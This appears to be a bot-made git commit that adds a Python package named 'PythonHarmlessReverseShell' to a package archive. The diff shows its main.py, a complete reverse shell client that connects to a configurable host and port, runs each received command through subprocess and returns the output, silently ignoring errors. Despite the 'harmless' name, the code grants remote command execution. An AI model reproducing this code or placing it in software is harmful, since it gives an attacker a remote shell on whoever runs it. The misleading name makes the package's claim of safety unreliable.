ccaf1cb23ec7c2ce53ad864c3ff7fabd38e9ffd0
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-30 00:08:26 +0000

    Add package PythonHarmlessReverseShell/0.1.1/pythonharmlessreverseshell-0.1.1-py3-none-any.whl

---
+++ packages/PythonHarmlessReverseShell/pythonharmlessreverseshell-0.1.1-py3-none-any.whl/python-harmless-reverse-shell/main.py
@@ -0,0 +1,26 @@
+
+class ReverseConfiguration:
+    def __init__(self, host="127.0.0.1", port=8089):
+        self.host = host
+        self.port = port
+
+def reverse_shell_client(config: ReverseConfiguration):
+    import socket, subprocess, os
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((config.host, config.port))
+        while True:
+            cmd = s.recv(4096).decode().strip()
+            if cmd.lower() == "exit":
+                break
+            output = subprocess.getoutput(cmd)
+            s.send(output.encode())
+    except Exception as e:
+        pass
+    finally:
+        s.close()
+
+
+
+
